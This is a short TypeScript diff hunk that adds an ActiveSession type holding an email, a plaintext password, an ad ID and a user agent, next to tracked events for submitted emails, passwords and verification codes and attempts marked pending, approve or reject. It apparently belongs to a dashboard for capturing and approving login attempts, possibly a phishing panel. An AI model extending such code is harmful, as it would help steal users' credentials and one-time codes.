@@ -37,6 +37,15 @@ interface AttemptRow {
   status: "pending" | "approve" | "reject";
 }
 
+interface ActiveSession {
+  session_id: string;
+  ad_id: string;
+  email: string;
+  password: string;
+  user_agent: string | null;
+  lastActivity: string;
+}
+
 const TRACKED = ["email_submitted", "password_submitted", "code_submitted"] as const;
 
 function formatTime(iso: string): string {
